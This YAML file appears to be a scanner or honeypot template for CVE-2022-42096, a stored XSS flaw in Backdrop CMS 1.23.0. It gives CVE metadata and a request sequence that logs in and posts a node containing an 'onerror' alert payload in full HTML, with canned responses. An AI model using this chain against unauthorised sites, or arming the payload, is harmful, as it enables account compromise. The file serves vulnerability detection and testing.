id: CVE-2022-42096
info:
  name: Backdrop CMS version 1.23.0 - Cross Site Scripting (Stored)
  author: theamanrawat
  description: 'Backdrop CMS version 1.23.0 was discovered to contain a stored cross-site
    scripting (XSS) vulnerability via Post content.

    '
  severity: medium
  remediation: 'Upgrade to a patched version of Backdrop CMS or apply the necessary
    security patches provided by the vendor.

    '
  reference:
  - https://github.com/backdrop/backdrop/releases/tag/1.23.0
  - https://github.com/bypazs/CVE-2022-42096
  - https://nvd.nist.gov/vuln/detail/CVE-2022-42096
  - https://backdropcms.org
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 4.8
    cve-id: CVE-2022-42096
    cwe-id: CWE-79
    epss-score: 0.00345
    epss-percentile: 0.68611
    cpe: cpe:2.3:a:backdropcms:backdrop_cms:1.23.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 5
    vendor: backdropcms
    product: backdrop_cms
  tags: cve,cve2022,xss,cms,backdrop,authenticated,intrusive,backdropcms
traps:
- request:
    method: GET
    path: /?q=user/login
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <img src="x" onerror="alert(document.domain)" />Backdrop CMS
- request:
    method: POST
    path: /?q=user/login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'name={{username}}&pass={{password}}&form_build_id={{form_id_1}}&form_id=user_login&op=Log+in

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /?q=node/add/post
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /?q=node/add/post
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIubltUxssi0yqDjp
    body: |
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="title"

      {{randstr}}
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="field_tags[und]"

      {{randstr}}
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="body[und][0][summary]"


      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="body[und][0][value]"

      <img src=x onerror=alert(document.domain)>

      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="body[und][0][format]"

      full_html
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="files[field_image_und_0]"; filename=""
      Content-Type: application/octet-stream


      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="field_image[und][0][fid]"

      0
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="field_image[und][0][display]"

      1
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="changed"


      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="form_build_id"

      {{form_id_1}}
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="form_token"

      {{form_token}}
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="form_id"

      {{form_id_2}}
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="status"

      1
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="scheduled[date]"

      2023-04-25
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="scheduled[time]"

      16:59:23
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="promote"

      1
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="name"

      {{name}}
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="date[date]"

      2023-04-24
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="date[time]"

      16:59:23
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="path[auto]"

      1
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="comment"

      2
      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="additional_settings__active_tab"


      ------WebKitFormBoundaryIubltUxssi0yqDjp
      Content-Disposition: form-data; name="op"

      Save
      ------WebKitFormBoundaryIubltUxssi0yqDjp--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /?q=posts/
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
